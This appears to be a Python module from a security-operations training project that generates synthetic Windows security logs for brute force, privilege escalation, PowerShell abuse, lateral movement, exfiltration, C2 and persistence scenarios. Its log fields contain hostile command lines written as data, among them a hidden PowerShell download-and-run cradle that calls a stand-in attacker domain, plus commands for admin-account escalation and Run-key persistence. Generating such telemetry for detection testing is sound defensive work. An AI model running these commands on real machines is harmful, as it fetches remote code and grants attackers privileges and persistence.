# Attack Simulation Engine for ThreatOps SOC

import asyncio
import random
import logging
import json
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Any, Optional
from pathlib import Path
import ipaddress

from collectors.log_collector import LogEntry

logger = logging.getLogger(__name__)

class AttackScenario:
    """Attack scenario configuration"""
    
    def __init__(self, **kwargs):
        self.name = kwargs.get('name', '')
        self.description = kwargs.get('description', '')
        self.mitre_technique = kwargs.get('mitre_technique', '')
        self.severity = kwargs.get('severity', 'Medium')
        self.duration_minutes = kwargs.get('duration_minutes', 10)
        self.log_count = kwargs.get('log_count', 50)
        self.enabled = kwargs.get('enabled', True)
        
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'name': self.name,
            'description': self.description,
            'mitre_technique': self.mitre_technique,
            'severity': self.severity,
            'duration_minutes': self.duration_minutes,
            'log_count': self.log_count,
            'enabled': self.enabled
        }

class AttackSimulator:
    """Main attack simulation engine"""
    
    def __init__(self, settings):
        self.settings = settings
        self.scenarios = self._load_scenarios()
        self.malicious_ips = self._generate_malicious_ips()
        self.malicious_domains = self._generate_malicious_domains()
        self.malicious_hashes = self._generate_malicious_hashes()
        
    def _load_scenarios(self) -> List[AttackScenario]:
        """Load attack scenarios"""
        scenarios = [
            AttackScenario(
                name="Brute Force Attack",
                description="Simulate brute force login attempts",
                mitre_technique="T1110",
                severity="High",
                duration_minutes=15,
                log_count=100,
                enabled=True
            ),
            AttackScenario(
                name="Privilege Escalation",
                description="Simulate privilege escalation attempts",
                mitre_technique="T1078",
                severity="Critical",
                duration_minutes=5,
                log_count=20,
                enabled=True
            ),
            AttackScenario(
                name="Suspicious PowerShell",
                description="Simulate malicious PowerShell execution",
                mitre_technique="T1059.001",
                severity="Medium",
                duration_minutes=10,
                log_count=30,
                enabled=True
            ),
            AttackScenario(
                name="Lateral Movement",
                description="Simulate lateral movement attempts",
                mitre_technique="T1021",
                severity="High",
                duration_minutes=20,
                log_count=80,
                enabled=True
            ),
            AttackScenario(
                name="Data Exfiltration",
                description="Simulate data exfiltration attempts",
                mitre_technique="T1041",
                severity="Critical",
                duration_minutes=30,
                log_count=40,
                enabled=True
            ),
            AttackScenario(
                name="Malware Execution",
                description="Simulate malware execution",
                mitre_technique="T1055",
                severity="High",
                duration_minutes=8,
                log_count=25,
                enabled=True
            ),
            AttackScenario(
                name="Command and Control",
                description="Simulate C2 communication",
                mitre_technique="T1071",
                severity="High",
                duration_minutes=25,
                log_count=60,
                enabled=True
            ),
            AttackScenario(
                name="Persistence",
                description="Simulate persistence mechanisms",
                mitre_technique="T1543",
                severity="Medium",
                duration_minutes=12,
                log_count=35,
                enabled=True
            )
        ]
        
        logger.info(f"Loaded {len(scenarios)} attack scenarios")
        return scenarios
    
    def _generate_malicious_ips(self) -> List[str]:
        """Generate malicious IP addresses for simulation"""
        malicious_ips = [
            "103.41.12.77",
            "185.220.101.42",
            "198.96.155.3",
            "45.146.164.110",
            "185.220.100.240",
            "192.168.1.100",  # Internal malicious IP
            "10.0.0.50",      # Internal malicious IP
            "172.16.0.25"     # Internal malicious IP
        ]
        return malicious_ips
    
    def _generate_malicious_domains(self) -> List[str]:
        """Generate malicious domains for simulation"""
        malicious_domains = [
            "malicious-domain.com",
            "evil-site.net",
            "phishing-site.org",
            "malware-download.info",
            "suspicious-domain.co.uk",
            "bad-actor.com",
            "threat-domain.net",
            "malicious-c2.org"
        ]
        return malicious_domains
    
    def _generate_malicious_hashes(self) -> List[str]:
        """Generate malicious file hashes for simulation"""
        malicious_hashes = [
            "5d41402abc4b2a76b9719d911017c592",
            "098f6bcd4621d373cade4e832627b4f6",
            "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
            "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        ]
        return malicious_hashes
    
    async def initialize(self):
        """Initialize attack simulator"""
        logger.info("Initializing attack simulator...")
        
        # Create simulation data directory
        sim_dir = Path(self.settings.data_dir) / "simulations"
        sim_dir.mkdir(parents=True, exist_ok=True)
        
        logger.info("Attack simulator initialized successfully")
    
    async def generate_attack_logs(self, scenario_name: Optional[str] = None) -> List[LogEntry]:
        """Generate attack logs for specified scenario or all scenarios"""
        all_logs = []
        
        if scenario_name:
            scenarios = [s for s in self.scenarios if s.name == scenario_name and s.enabled]
        else:
            scenarios = [s for s in self.scenarios if s.enabled]
        
        for scenario in scenarios:
            try:
                logs = await self._simulate_scenario(scenario)
                all_logs.extend(logs)
                logger.info(f"Generated {len(logs)} logs for scenario: {scenario.name}")
            except Exception as e:
                logger.error(f"Error simulating scenario {scenario.name}: {e}")
        
        # Sort by timestamp
        all_logs.sort(key=lambda x: x.timestamp)
        
        logger.info(f"Total attack logs generated: {len(all_logs)}")
        return all_logs
    
    async def _simulate_scenario(self, scenario: AttackScenario) -> List[LogEntry]:
        """Simulate a specific attack scenario"""
        if scenario.name == "Brute Force Attack":
            return await self._simulate_brute_force(scenario)
        elif scenario.name == "Privilege Escalation":
            return await self._simulate_privilege_escalation(scenario)
        elif scenario.name == "Suspicious PowerShell":
            return await self._simulate_suspicious_powershell(scenario)
        elif scenario.name == "Lateral Movement":
            return await self._simulate_lateral_movement(scenario)
        elif scenario.name == "Data Exfiltration":
            return await self._simulate_data_exfiltration(scenario)
        elif scenario.name == "Malware Execution":
            return await self._simulate_malware_execution(scenario)
        elif scenario.name == "Command and Control":
            return await self._simulate_c2_communication(scenario)
        elif scenario.name == "Persistence":
            return await self._simulate_persistence(scenario)
        else:
            logger.warning(f"Unknown scenario: {scenario.name}")
            return []
    
    async def _simulate_brute_force(self, scenario: AttackScenario) -> List[LogEntry]:
        """Simulate brute force attack"""
        logs = []
        start_time = datetime.now(timezone.utc)
        malicious_ip = random.choice(self.malicious_ips)
        
        # Generate failed login attempts
        for i in range(scenario.log_count):
            timestamp = start_time + timedelta(minutes=i * scenario.duration_minutes / scenario.log_count)
            
            # Vary the target users
            users = ["admin", "administrator", "root", "user", "guest", "test"]
            target_user = random.choice(users)
            
            log = LogEntry(
                timestamp=timestamp,
                host=f"WIN-PC{random.randint(1, 10):02d}",
                user=target_user,
                event_id=4625,  # Failed logon
                ip=malicious_ip,
                message=f"Failed logon attempt for user {target_user} from {malicious_ip}",
                event_type="failed_logon",
                severity="warning",
                source="attack_simulation",
                raw_data={
                    "TargetUserName": target_user,
                    "IpAddress": malicious_ip,
                    "LogonType": random.choice([2, 3, 10]),
                    "FailureReason": "%%2313"
                }
            )
            logs.append(log)
        
        return logs
    
    async def _simulate_privilege_escalation(self, scenario: AttackScenario) -> List[LogEntry]:
        """Simulate privilege escalation attempts"""
        logs = []
        start_time = datetime.now(timezone.utc)
        
        for i in range(scenario.log_count):
            timestamp = start_time + timedelta(minutes=i * scenario.duration_minutes / scenario.log_count)
            
            # Simulate privilege escalation events
            event_types = [
                (4672, "privilege_escalation", "Privilege escalation attempt"),
                (4688, "process_creation", "Process created with elevated privileges"),
                (4697, "service_creation", "Service created with elevated privileges")
            ]
            
            event_id, event_type, message = random.choice(event_types)
            
            log = LogEntry(
                timestamp=timestamp,
                host=f"WIN-PC{random.randint(1, 10):02d}",
                user=random.choice(["malicious_user", "compromised_account", "attacker"]),
                event_id=event_id,
                ip=random.choice(self.malicious_ips),
                message=message,
                event_type=event_type,
                severity="critical",
                source="attack_simulation",
                raw_data={
                    "SubjectUserName": random.choice(["malicious_user", "compromised_account"]),
                    "TargetUserName": "SYSTEM",
                    "ProcessName": random.choice(["cmd.exe", "powershell.exe", "reg.exe"]),
                    "CommandLine": random.choice([
                        "cmd.exe /c net user administrator /active:yes",
                        "powershell.exe -Command Add-LocalGroupMember -Group 'Administrators' -Member 'attacker'",
                        "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v malware /t REG_SZ /d malware.exe"
                    ])
                }
            )
            logs.append(log)
        
        return logs
    
    async def _simulate_suspicious_powershell(self, scenario: AttackScenario) -> List[LogEntry]:
        """Simulate suspicious PowerShell execution"""
        logs = []
        start_time = datetime.now(timezone.utc)
        
        suspicious_commands = [
            "powershell.exe -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMQAwAA==",
            "powershell.exe -w hidden -nop -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload.ps1')",
            "powershell.exe -Command Invoke-Expression (Get-Content malware.ps1)",
            "powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
            "powershell.exe -Command Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process",
            "powershell.exe -Command Get-WmiObject -Class Win32_Process | Where-Object {$_.Name -eq 'malware.exe'}",
            "powershell.exe -Command Add-Type -AssemblyName System.Web; [System.Web.HttpUtility]::UrlDecode('encoded_payload')"
        ]
        
        for i in range(scenario.log_count):
            timestamp = start_time + timedelta(minutes=i * scenario.duration_minutes / scenario.log_count)
            
            log = LogEntry(
                timestamp=timestamp,
                host=f"WIN-PC{random.randint(1, 10):02d}",
                user=random.choice(["admin", "user", "service_account"]),
                event_id=4688,  # Process creation
                ip=random.choice(self.malicious_ips),
                message="Suspicious PowerShell execution detected",
                process_name="powershell.exe",
                command_line=random.choice(suspicious_commands),
                event_type="process_creation",
                severity="warning",
                source="attack_simulation",
                raw_data={
                    "ProcessName": "powershell.exe",
                    "CommandLine": random.choice(suspicious_commands),
                    "ParentProcessName": random.choice(["cmd.exe", "explorer.exe", "chrome.exe"]),
                    "ProcessId": random.randint(1000, 9999)
                }
            )
            logs.append(log)
        
        return logs
    
    async def _simulate_lateral_movement(self, scenario: AttackScenario) -> List[LogEntry]:
        """Simulate lateral movement attempts"""
        logs = []
        start_time = datetime.now(timezone.utc)
        
        # Simulate network connections to sensitive ports
        sensitive_ports = [135, 139, 445, 5985, 5986, 3389, 22, 23]
        
        for i in range(scenario.log_count):
            timestamp = start_time + timedelta(minutes=i * scenario.duration_minutes / scenario.log_count)
            
            # Simulate network connection events
            dest_port = random.choice(sensitive_ports)
            dest_ip = f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"
            
            log = LogEntry(
                timestamp=timestamp,
                host=f"WIN-PC{random.randint(1, 10):02d}",
                user=random.choice(["admin", "user", "service_account"]),
                event_id=5156,  # Network connection
                ip=random.choice(self.malicious_ips),
                message=f"Network connection to port {dest_port}",
                event_type="network_connection",
                severity="warning",
                source="attack_simulation",
                raw_data={
                    "SourceIP": random.choice(self.malicious_ips),
                    "DestinationIP": dest_ip,
                    "DestinationPort": dest_port,
                    "Protocol": random.choice(["TCP", "UDP"]),
                    "ProcessName": random.choice(["smbclient.exe", "psexec.exe", "wmic.exe", "powershell.exe"]),
                    "ConnectionType": "Outbound"
                }
            )
            logs.append(log)
        
        return logs
    
    async def _simulate_data_exfiltration(self, scenario: AttackScenario) -> List[LogEntry]:
        """Simulate data exfiltration attempts"""
        logs = []
        start_time = datetime.now(timezone.utc)
        
        for i in range(scenario.log_count):
            timestamp = start_time + timedelta(minutes=i * scenario.duration_minutes / scenario.log_count)
            
            # Simulate large data transfers
            data_sizes = [10485760, 52428800, 104857600, 209715200]  # 10MB, 50MB, 100MB, 200MB
            data_size = random.choice(data_sizes)
            dest_ip = random.choice(self.malicious_ips)
            
            log = LogEntry(
                timestamp=timestamp,
                host=f"WIN-PC{random.randint(1, 10):02d}",
                user=random.choice(["admin", "user", "service_account"]),
                event_id=1003,  # Custom data transfer event
                ip=dest_ip,
                message=f"Large data transfer detected: {data_size} bytes to {dest_ip}",
                event_type="data_transfer",
                severity="critical",
                source="attack_simulation",
                raw_data={
                    "SourceIP": f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}",
                    "DestinationIP": dest_ip,
                    "DataSize": data_size,
                    "Protocol": "HTTPS",
                    "ProcessName": random.choice(["powershell.exe", "curl.exe", "wget.exe", "ftp.exe"]),
                    "FileName": random.choice(["sensitive_data.zip", "database_backup.sql", "confidential.pdf", "user_credentials.txt"])
                }
            )
            logs.append(log)
        
        return logs
    
    async def _simulate_malware_execution(self, scenario: AttackScenario) -> List[LogEntry]:
        """Simulate malware execution"""
        logs = []
        start_time = datetime.now(timezone.utc)
        
        malware_processes = [
            "malware.exe",
            "trojan.exe",
            "backdoor.exe",
            "keylogger.exe",
            "ransomware.exe",
            "bot.exe",
            "spyware.exe"
        ]
        
        for i in range(scenario.log_count):
            timestamp = start_time + timedelta(minutes=i * scenario.duration_minutes / scenario.log_count)
            
            malware_name = random.choice(malware_processes)
            malicious_hash = random.choice(self.malicious_hashes)
            
            log = LogEntry(
                timestamp=timestamp,
                host=f"WIN-PC{random.randint(1, 10):02d}",
                user=random.choice(["admin", "user", "service_account"]),
                event_id=4688,  # Process creation
                ip=random.choice(self.malicious_ips),
                message=f"Malware execution detected: {malware_name}",
                process_name=malware_name,
                command_line=f"{malware_name} --stealth --persist",
                event_type="process_creation",
                severity="critical",
                source="attack_simulation",
                raw_data={
                    "ProcessName": malware_name,
                    "CommandLine": f"{malware_name} --stealth --persist",
                    "FileHash": malicious_hash,
                    "ParentProcessName": random.choice(["powershell.exe", "cmd.exe", "explorer.exe"]),
                    "ProcessId": random.randint(1000, 9999),
                    "ImagePath": f"C:\\Windows\\Temp\\{malware_name}"
                }
            )
            logs.append(log)
        
        return logs
    
    async def _simulate_c2_communication(self, scenario: AttackScenario) -> List[LogEntry]:
        """Simulate command and control communication"""
        logs = []
        start_time = datetime.now(timezone.utc)
        
        c2_domains = self.malicious_domains[:3]  # Use first 3 domains as C2
        
        for i in range(scenario.log_count):
            timestamp = start_time + timedelta(minutes=i * scenario.duration_minutes / scenario.log_count)
            
            c2_domain = random.choice(c2_domains)
            c2_ip = random.choice(self.malicious_ips)
            
            # Simulate DNS queries and HTTP requests
            event_types = [
                (1004, "dns_query", f"DNS query to suspicious domain: {c2_domain}"),
                (1005, "http_request", f"HTTP request to C2 server: {c2_domain}"),
                (1006, "network_connection", f"Network connection to C2 server: {c2_ip}")
            ]
            
            event_id, event_type, message = random.choice(event_types)
            
            log = LogEntry(
                timestamp=timestamp,
                host=f"WIN-PC{random.randint(1, 10):02d}",
                user=random.choice(["admin", "user", "service_account"]),
                event_id=event_id,
                ip=c2_ip,
                message=message,
                event_type=event_type,
                severity="warning",
                source="attack_simulation",
                raw_data={
                    "Domain": c2_domain,
                    "DestinationIP": c2_ip,
                    "Protocol": "HTTPS",
                    "UserAgent": random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "curl/7.68.0",
                        "Python-urllib/3.8"
                    ]),
                    "ProcessName": random.choice(["powershell.exe", "cmd.exe", "malware.exe"]),
                    "RequestPath": random.choice(["/api/command", "/beacon", "/update", "/data"])
                }
            )
            logs.append(log)
        
        return logs
    
    async def _simulate_persistence(self, scenario: AttackScenario) -> List[LogEntry]:
        """Simulate persistence mechanisms"""
        logs = []
        start_time = datetime.now(timezone.utc)
        
        persistence_methods = [
            (7045, "service_installation", "Malicious service installed"),
            (4697, "service_creation", "Service created for persistence"),
            (1007, "registry_modification", "Registry modified for persistence"),
            (1008, "scheduled_task", "Scheduled task created for persistence"),
            (1009, "startup_program", "Program added to startup for persistence")
        ]
        
        for i in range(scenario.log_count):
            timestamp = start_time + timedelta(minutes=i * scenario.duration_minutes / scenario.log_count)
            
            event_id, event_type, message = random.choice(persistence_methods)
            
            log = LogEntry(
                timestamp=timestamp,
                host=f"WIN-PC{random.randint(1, 10):02d}",
                user=random.choice(["admin", "user", "service_account"]),
                event_id=event_id,
                ip=random.choice(self.malicious_ips),
                message=message,
                event_type=event_type,
                severity="warning",
                source="attack_simulation",
                raw_data={
                    "ServiceName": random.choice(["MaliciousService", "SystemUpdate", "WindowsHelper"]),
                    "ServicePath": random.choice([
                        "C:\\Windows\\System32\\malware.exe",
                        "C:\\Windows\\Temp\\backdoor.exe",
                        "C:\\Users\\Public\\trojan.exe"
                    ]),
                    "RegistryKey": random.choice([
                        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                        "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
                    ]),
                    "TaskName": random.choice(["SystemMaintenance", "WindowsUpdate", "SecurityScan"]),
                    "ProcessName": random.choice(["reg.exe", "schtasks.exe", "sc.exe"])
                }
            )
            logs.append(log)
        
        return logs
    
    async def save_simulation_logs(self, logs: List[LogEntry], scenario_name: str):
        """Save simulation logs to file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"simulation_{scenario_name}_{timestamp}.json"
        
        sim_dir = Path(self.settings.data_dir) / "simulations"
        file_path = sim_dir / filename
        
        with open(file_path, 'w') as f:
            for log in logs:
                f.write(json.dumps(log.to_dict()) + '\n')
        
        logger.info(f"Saved {len(logs)} simulation logs to {file_path}")
        
        # Also write to Filebeat-monitored log file for OpenSearch ingestion
        await self._write_to_filebeat_log(logs)
        
        return file_path
    
    async def _write_to_filebeat_log(self, logs: List[LogEntry]):
        """Write logs to file monitored by Filebeat for OpenSearch ingestion"""
        log_dir = Path(self.settings.data_dir) / "logs"
        log_dir.mkdir(parents=True, exist_ok=True)
        
        filebeat_log = log_dir / "sim_attacks.log"
        
        with open(filebeat_log, 'a') as f:
            for log in logs:
                # Write each log as a single-line JSON for Filebeat
                f.write(json.dumps(log.to_dict()) + '\n')
        
        logger.info(f"Appended {len(logs)} logs to {filebeat_log} for Filebeat ingestion")
    
    def get_scenario_statistics(self) -> Dict[str, Any]:
        """Get attack scenario statistics"""
        enabled_scenarios = [s for s in self.scenarios if s.enabled]
        
        return {
            'total_scenarios': len(self.scenarios),
            'enabled_scenarios': len(enabled_scenarios),
            'scenarios_by_severity': {
                'Critical': len([s for s in enabled_scenarios if s.severity == 'Critical']),
                'High': len([s for s in enabled_scenarios if s.severity == 'High']),
                'Medium': len([s for s in enabled_scenarios if s.severity == 'Medium']),
                'Low': len([s for s in enabled_scenarios if s.severity == 'Low'])
            },
            'total_malicious_ips': len(self.malicious_ips),
            'total_malicious_domains': len(self.malicious_domains),
            'total_malicious_hashes': len(self.malicious_hashes)
        }
